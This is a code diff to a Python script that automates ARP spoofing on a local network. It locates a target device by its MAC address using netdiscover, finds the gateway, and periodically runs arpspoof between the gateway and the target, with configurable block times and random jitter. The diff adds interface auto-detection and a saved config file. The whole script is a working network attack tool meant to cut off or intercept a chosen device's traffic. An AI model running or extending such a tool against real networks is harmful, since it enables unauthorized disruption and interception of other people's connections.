@@ -37,6 +37,7 @@ def vaildate_ip(ip_addr: str):
 class arpspoof_class(object):
 	def __init__(self, *, des_mac: str or None = None, des_ip: str or None = None, sleep_time: int = 60, arp_blocktime: int = 2, random_time: int = 0):
 		self.gateway_ip = ''
+		self.default_interfaces = 'eth0'
 		if len(sys.argv) > 1:
 			if mac_match.match(sys.argv[1]) is not None:
 				self.des_mac, self.des_ip = sys.argv[1], None
@@ -51,66 +52,99 @@ class arpspoof_class(object):
 				if not vaildate_ip(self.des_ip): raise ValueError('IP address is invaild')
 			elif mac_match.match(self.des_mac) is None:
 				raise ValueError('Mac address is invaild')
-		if self.des_ip is None:
-			self.get_ip_from_mac()
-		for _, interface in netifaces.gateways()['default'].items():
-			if 'eth0' in interface:
-				self.gateway_ip = interface[0]
-				break
-		if self.gateway_ip == '':
-			print(netifaces.gateways())
-			raise ValueError('Gateway ip error')
 		self.sleep_time = int(sleep_time)
 		self.current_sleep_time = self.sleep_time
 		self.arp_blocktime = int(arp_blocktime)
 		self.random_time = int(random_time)
+		if not self.load() and self.des_ip is None:
+			self.get_ip_from_mac()
+		if self.gateway_ip == '': self.get_gateway_ip()
+		self.save()
+	def checker(self):
+		if self.gateway_ip == '': return False
+		if self.des_mac == '' and vaildate_ip(self.des_ip): return True
+		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', '{}/32'.format(self.des_ip), '-i', self.default_interfaces, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+		netdiscover_proc.wait()
+		return self.des_mac in netdiscover_proc.communicate()[0].decode()
+	def load(self, file_name: str = '.arpcfg'):
+		try:
+			with open(file_name) as fin:
+				ip, mac, inf, gate = fin.read().split('\\\\n')
+			if self.des_mac == mac or self.des_ip == ip:
+				self.des_ip, self.des_mac, self.default_interfaces, self.gateway_ip = ip, mac, inf, gate
+			else: return False
+		except FileNotFoundError: pass
+		return self.checker()
+	def save(self, file_name: str = '.arpcfg'):
+		with open(file_name, 'w') as fout:
+			fout.write('\\\\n'.join((self.des_ip, self.des_mac, self.default_interfaces, self.gateway_ip)))
 	def get_ip_from_mac(self):
-		addrs, netmask, self.self_ip = netifaces.ifaddresses('eth0'), '', ''
-		for _, li in addrs.items():
-			if vaildate_ip(li[0]['addr']):
-				netmask = li[0]['netmask']
-				self.self_ip = li[0]['addr']
+		#print(netifaces.interfaces())
+		for interface in netifaces.interfaces():
+			if interface.startswith('lo') or interface.startswith('docker'): continue
+			#print('searching...', interface)
+			addrs, netmask, self.self_ip = netifaces.ifaddresses(interface), '', ''
+			for _, li in addrs.items():
+				if vaildate_ip(li[0]['addr']):
+					netmask = li[0]['netmask']
+					self.self_ip = li[0]['addr']
+					break
+			if netmask == '':
+				print(repr(addrs))
+				raise ValueError('Cannot find netmask')
+			ip_group = self.self_ip.split('.')
+			netmask_group = netmask.split('.')
+			breaksig = 4
+			for x in range(3, -1, -1):
+				if netmask_group[x] == '0':
+					ip_group[x] = '0'
+				else:
+					breaksig = x + 1
+					break
+			self.search_ip = '{}.{}.{}.{}/{}'.format(*ip_group, 8 * breaksig)
+			#print(self.search_ip)
+			try:
+				self.des_ip = self._call_netdiscover_search(self.search_ip, self.des_mac, interface)
+				self.default_interfaces = interface
+				if not vaildate_ip(self.des_ip): continue
+				#print(self.des_ip)
 				break
-		if netmask == '':
-			print(repr(addrs))
-			raise ValueError('Cannot find netmask')
-		ip_group = self.self_ip.split('.')
-		netmask_group = netmask.split('.')
-		breaksig = 4
-		for x in range(3, -1, -1):
-			if netmask_group[x] == '0':
-				ip_group[x] = '0'
-			else: 
-				breaksig = 5 - x
-				break
-		self.search_ip = '{}.{}.{}.{}/{}'.format(*ip_group, 8 * breaksig)
-		#print(self.search_ip)
-		self.des_ip = self._call_netdiscover_search(self.search_ip, self.des_mac)
+			except:
+				print(interface, self.search_ip)
 	@staticmethod
 	def get_random_time(base_time: int, random_range: int):
 		if random_range == 0: return base_time
 		return random.randint(base_time - random_range if base_time - random_range < 0 else 0, base_time + random_range)
 	@staticmethod
-	def _call_netdiscover_search(search_ip: str, mac_addr: str):
-		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', search_ip, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+	def _call_netdiscover_search(search_ip: str, mac_addr: str, interface: str):
+		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', search_ip, '-i', interface, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
 		#time.sleep(5)
 		netdiscover_proc.wait()
 		netdiscover_proc.send_signal(signal.SIGINT)
 		for x in netdiscover_proc.communicate()[0].decode().splitlines():
 			if mac_addr.lower() in x:
-				newl = x
 				break
 		#print(repr(x.split()))
 		return x.split()[0]
 	def main_spoof(self):
 		printl('Start spoof')
-		spoof = subprocess.Popen(['arpspoof', '-i', 'eth0', '-t', self.gateway_ip, '-r', self.des_ip])
+		spoof = subprocess.Popen(['arpspoof', '-i', self.default_interfaces, '-t', self.gateway_ip, '-r', self.des_ip])
 		time.sleep(self.arp_blocktime if self.random_time == 0 else self.arp_blocktime + random.randint(0, 2))
 		spoof.send_signal(signal.SIGINT)
 		printl('Wait arpspoof to exit (fix connection)')
 		spoof.wait()
 		self.current_sleep_time = self.get_random_time(self.sleep_time, self.random_time)
 		printl('Exited!(sleep {}(s))'.format(self.current_sleep_time))
+	def get_gateway_ip(self):
+		#print(self.default_interfaces)
+		for interface in netifaces.gateways()[2]:
+			#print(interface)
+			if self.default_interfaces in interface:
+				self.gateway_ip = interface[0]
+				break
+		if self.gateway_ip == '':
+			#print(netifaces.gateways())
+			raise ValueError('Gateway ip error')
 	def main_activity(self):
 		while True:
 			try:
@@ -121,7 +155,7 @@ class arpspoof_class(object):
 					try:
 						input('Paused, press Enter to continue')
 						break
-					except (EOFError, KeyboardInterrupt): 
+					except (EOFError, KeyboardInterrupt):
 						return
 			except:
 				import traceback
